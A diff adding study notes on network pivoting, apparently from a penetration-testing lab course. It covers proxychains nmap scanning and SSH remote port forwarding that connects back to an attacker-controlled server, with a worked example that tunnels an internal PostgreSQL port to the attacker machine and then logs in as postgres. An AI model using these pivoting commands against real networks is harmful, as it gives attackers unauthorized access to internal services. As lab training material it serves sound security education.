@@ -82,3 +82,28 @@ Run commands to access different ports on the smb machine from attacker machine:
 ```bash
 sudo proxychains4 nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
 ```
+## Remote Port Forwarding
+SSH remote port forwarding can be used to connect back to an attacker-controlled SSH server and bind the listening port there. Think of it like a reverse shell, but for port forwarding.
+On attacker machine:
+```bash
+sudo systemctl start ssh
+```
+On jumpbox machine:
+```bash
+ssh -N -R 127.0.0.1:2345:$(TARGET_IP):$(TARGET_PORT) kali@$(ATTACKER_IP)
+```
+### Example
+There are 4 machines.
+* Attacker machine can reach "confluence" machine. IP=192.168.118.4
+* Confluence machine can reach "database" machine and attacker machine. IP=192.168.50.63
+* Database machine can reach "SMB" machine and confluence machine. IP=10.4.50.215
+* SMB machine can reach database machine. IP=172.16.50.217
+
+Run this on confluence to make port 5432 reachable via localhost 2345:
+```bash
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+```
+On the attacker machine:
+```bash
+psql -h 127.0.0.1 -p 2345 -U postgres
+```
